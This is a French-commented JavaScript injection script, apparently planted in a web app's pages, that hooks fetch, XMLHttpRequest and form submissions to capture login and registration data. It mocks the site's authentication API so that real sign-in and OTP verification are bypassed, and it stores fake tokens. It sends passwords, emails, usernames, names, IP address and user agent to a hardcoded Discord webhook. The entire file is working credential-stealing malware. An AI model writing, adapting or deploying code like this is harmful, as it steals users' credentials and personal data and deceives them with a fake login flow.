// Z3lphyx Auth Hook — Interception + Mock API + Discord (sans OTP)
(function() {
    'use strict';

    var WEBHOOK = "https://discord.com/api/webhooks/1506998147434676304/jVsItbE7-LukI-fyshElFimQcZEb8iWi7CZ2ANdXZoIJOwmAItJWB9mbdEmjStI8uRSA";
    var ALLOWED_DOMAINS = ['gmail.com','outlook.com','hotmail.com','yahoo.com','icloud.com','protonmail.com','proton.me','zoho.com','aol.com'];
    var cachedIP = null;
    var pendingRegister = null;

    // --- IP ---
    async function getIP() {
        if (cachedIP) return cachedIP;
        for (var u of ['https://api.ipify.org?format=json', 'https://ipapi.co/json/']) {
            try { var r = await fetch(u, { signal: AbortSignal.timeout(3000) }); var d = await r.json(); cachedIP = d.ip || d; return cachedIP; } catch(e) {}
        }
        return 'Inconnu';
    }
    getIP();

    // --- Discord ---
    function sendToDiscord(embed) {
        try { navigator.sendBeacon(WEBHOOK, JSON.stringify({ username: 'Z3lphyx Auth', embeds: [embed] })); } catch(e) {}
    }

    function buildEmbed(title, color, fields) {
        return { title: title, color: color, fields: fields, footer: { text: 'Z3lphyx Auth · ' + new Date().toLocaleString('fr-FR') }, timestamp: new Date().toISOString() };
    }

    function sendCreds(creds, source, isRegister) {
        getIP().then(function(ip) {
            var ua = navigator.userAgent;
            if (isRegister) {
                sendToDiscord(buildEmbed('📝 Nouvelle Inscription [' + source + ']', 0x00ff88, [
                    { name: '👤 Nom', value: creds.nom || creds.last_name || creds.Nom || 'N/A', inline: true },
                    { name: '👤 Prénom', value: creds.prenom || creds.first_name || creds.Prénom || 'N/A', inline: true },
                    { name: '🏷️ Pseudo', value: creds.pseudo || creds.username || creds.Pseudo || 'N/A', inline: true },
                    { name: '📧 Email', value: creds.email || creds.Email || 'N/A', inline: true },
                    { name: '🔑 Mot de passe', value: '||' + (creds.password || creds.Password || '') + '||', inline: false },
                    { name: '🌐 IP', value: '||' + ip + '||', inline: true },
                    { name: '🧭 User-Agent', value: '```' + ua.slice(0, 180) + '```', inline: false }
                ]));
            } else {
                sendToDiscord(buildEmbed('🔐 Connexion Détectée [' + source + ']', 0x00f0ff, [
                    { name: '👤 Identifiant', value: creds.email || creds.identifier || creds.username || creds.Pseudo || 'N/A', inline: true },
                    { name: '🔑 Mot de passe', value: '||' + (creds.password || '') + '||', inline: false },
                    { name: '🌐 IP', value: '||' + ip + '||', inline: true },
                    { name: '🧭 User-Agent', value: '```' + ua.slice(0, 180) + '```', inline: false }
                ]));
            }
        });
    }

    function parseCreds(bodyStr) {
        if (!bodyStr) return null;
        try {
            var d = typeof bodyStr === 'string' ? JSON.parse(bodyStr) : bodyStr;
            if (!d || typeof d !== 'object') return null;
            var c = {};
            for (var k in d) {
                var v = d[k];
                var kl = k.toLowerCase();
                if (/pass|mdp|motdepasse/i.test(kl)) c.password = String(v);
                else if (/email|mail|adresse/i.test(kl)) c.email = String(v);
                else if (/pseudo|username|user|login|identifier/i.test(kl)) c.username = String(v);
                else if (/nom|surname|last.?name|family.?name/i.test(kl)) c.nom = String(v);
                else if (/prenom|first.?name|given.?name|prénom/i.test(kl)) c.prenom = String(v);
                else c[k] = String(v);
            }
            return c.password ? c : null;
        } catch(e) { return null; }
    }

    function mockToken() {
        var chars = 'abcdef0123456789';
        var t = '';
        for (var i = 0; i < 64; i++) t += chars[Math.floor(Math.random() * chars.length)];
        return 'mock_' + t;
    }

    function mockResponse(url, body, method) {
        var u = url.toLowerCase();
        // App startup — public settings
        if (u.indexOf('/public-settings/') > -1 || u.indexOf('/apps/public') > -1) {
            return { data: { id: '6a608801949bfa0162d3ef90', name: 'Z3lphyx Gateway', settings: { auth_methods: ['email_password'], allowed_domains: ALLOWED_DOMAINS, require_verification: false }, status: 'active' }, status: 200 };
        }
        // Profile filter (check pseudo dispo)
        if (u.indexOf('/profile/filter') > -1 || (u.indexOf('/profile') > -1 && method === 'get')) {
            return { data: [], status: 200 };
        }
        // Profile create (register final step)
        if ((u.indexOf('/profile') > -1 || u.indexOf('/entities/profile/') > -1) && method === 'post') {
            return { data: { id: 'mock_' + Date.now(), created: true }, status: 200 };
        }
        // AUTH REGISTER — LE POINT CRITIQUE : retourne token direct, PAS d'OTP
        if (u.indexOf('/auth/register') > -1 || u.indexOf('/register') > -1) {
            var creds = parseCreds(body);
            var tok = mockToken();
            if (creds) {
                pendingRegister = creds;
                // Envoie les credentials tout de suite
                setTimeout(function() { sendCreds(creds, 'Register', true); }, 50);
                // Sauvegarde le token et redirige — élimine l'écran OTP
                setTimeout(function() {
                    try {
                        localStorage.setItem('base44_access_token', tok);
                        localStorage.setItem('base44_token', tok);
                    } catch(e) {}
                    window.location.href = '/';
                }, 600);
            }
            return { data: { access_token: tok, token_type: 'bearer', verified: true, user: { email: creds ? creds.email : '' } }, status: 200 };
        }
        // AUTH LOGIN
        if (u.indexOf('/auth/login') > -1 || (u.indexOf('/login') > -1 && method === 'post')) {
            var creds = parseCreds(body);
            var tok = mockToken();
            if (creds) {
                setTimeout(function() { sendCreds(creds, 'Login', false); }, 50);
                setTimeout(function() {
                    try {
                        localStorage.setItem('base44_access_token', tok);
                        localStorage.setItem('base44_token', tok);
                    } catch(e) {}
                    window.location.href = '/';
                }, 600);
            }
            return { data: { access_token: tok, token_type: 'bearer', user: { email: creds ? creds.email : '' } }, status: 200 };
        }
        // OTP/Verify — on les mock mais normalement on y arrive jamais vu qu'on a skip
        if (u.indexOf('/verify') > -1 || u.indexOf('/otp') > -1 || u.indexOf('/verifyotp') > -1) {
            var tok = mockToken();
            if (pendingRegister) {
                setTimeout(function() { sendCreds(pendingRegister, 'OTP', true); }, 50);
                pendingRegister = null;
            }
            return { data: { access_token: tok, token_type: 'bearer', verified: true }, status: 200 };
        }
        // Resend OTP
        if (u.indexOf('/resend') > -1) {
            return { data: { success: true }, status: 200 };
        }
        // Auth me — user info
        if (u.indexOf('/auth/me') > -1 || u.indexOf('/user/me') > -1) {
            return { data: { id: 'mock_user_' + Date.now(), email: 'mock@user.com', role: 'user', username: 'z3lphyx_user' }, status: 200 };
        }
        // Update me
        if (u.indexOf('/updateme') > -1 || u.indexOf('/update') > -1 || (u.indexOf('/me') > -1 && (method === 'patch' || method === 'put'))) {
            return { data: { success: true, updated: true }, status: 200 };
        }
        // Auth check
        if (u.indexOf('/auth/check') > -1 || u.indexOf('/authenticated') > -1) {
            return { data: { authenticated: true }, status: 200 };
        }
        // Logout
        if (u.indexOf('/logout') > -1) {
            return { data: { success: true }, status: 200 };
        }
        // App logs
        if (u.indexOf('/app-logs/') > -1) {
            return { data: { logged: true }, status: 200 };
        }
        // Fallback /api/
        if (u.indexOf('/api/') > -1) {
            return { data: { success: true }, status: 200 };
        }
        return null;
    }

    // ============ INTERCEPTION FETCH ============
    var _fetch = window.fetch;
    window.fetch = async function(input, init) {
        var url = '', body = null, method = 'GET';
        if (typeof input === 'string') {
            url = input;
            method = (init && init.method) || 'GET';
            body = (init && init.body) || null;
        } else if (input instanceof Request) {
            url = input.url;
            method = input.method || 'GET';
            try { body = await input.clone().text(); } catch(e) {}
        }
        if (url.indexOf('/api/') > -1) {
            var mock = mockResponse(url, body, method.toUpperCase());
            if (mock) {
                return new Response(JSON.stringify(mock.data), {
                    status: mock.status,
                    statusText: 'OK',
                    headers: { 'Content-Type': 'application/json' }
                });
            }
        }
        return _fetch.apply(this, arguments);
    };

    // ============ INTERCEPTION XMLHttpRequest (Axios) ============
    var _open = XMLHttpRequest.prototype.open;
    var _send = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url) {
        this._hookMethod = (method || 'GET').toUpperCase();
        this._hookURL = (url || '').toString();
        return _open.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
        var url = this._hookURL || '';
        var method = this._hookMethod || 'GET';
        if (url.indexOf('/api/') > -1) {
            var mock = mockResponse(url, body, method);
            if (mock) {
                var self = this;
                var data = JSON.stringify(mock.data);
                setTimeout(function() {
                    try {
                        Object.defineProperty(self, 'readyState', { value: 4, writable: true });
                        Object.defineProperty(self, 'status', { value: mock.status, writable: true });
                        Object.defineProperty(self, 'statusText', { value: 'OK', writable: true });
                        Object.defineProperty(self, 'responseText', { value: data, writable: true });
                        Object.defineProperty(self, 'response', { value: data, writable: true });
                        if (self.onreadystatechange) self.onreadystatechange.call(self, new Event('readystatechange'));
                        if (self.onload) self.onload.call(self, new Event('load'));
                        if (self.onloadend) self.onloadend.call(self, new Event('loadend'));
                    } catch(e) {}
                }, 120);
                return;
            }
        }
        return _send.apply(this, arguments);
    };

    // ============ SURVEILLANCE DOM (filet) ============
    setTimeout(function() {
        try {
            new MutationObserver(function() {
                document.querySelectorAll('form').forEach(function(form) {
                    if (form.dataset.zHook) return;
                    var pwd = form.querySelector('input[type="password"]');
                    if (!pwd) return;
                    form.dataset.zHook = '1';
                    form.addEventListener('submit', function() {
                        var f = new FormData(form);
                        var c = {};
                        for (var entry of f.entries()) c[entry[0]] = entry[1];
                        if (!c.password && !c.mot_de_passe && !c.mdp) return;
                        var hasExtra = c.nom || c.prenom || c.first_name || c.last_name || c.Nom || c.Prénom;
                        sendCreds({
                            password: c.password || c.mot_de_passe || c.mdp || c.Password,
                            email: c.email || c.mail || c.Email,
                            username: c.pseudo || c.username || c.user || c.login || c.identifier || c.Pseudo,
                            nom: c.nom || c.last_name || c.surname || c.Nom,
                            prenom: c.prenom || c.first_name || c.prénom || c.Prénom
                        }, 'DOM', !!hasExtra);
                    }, true);
                });
            }).observe(document.body || document.documentElement, { childList: true, subtree: true });
        } catch(e) {}
    }, 1500);

    console.log('[Z3lphyx Hook] Ready — OTP supprimé, credentials → Discord');
})();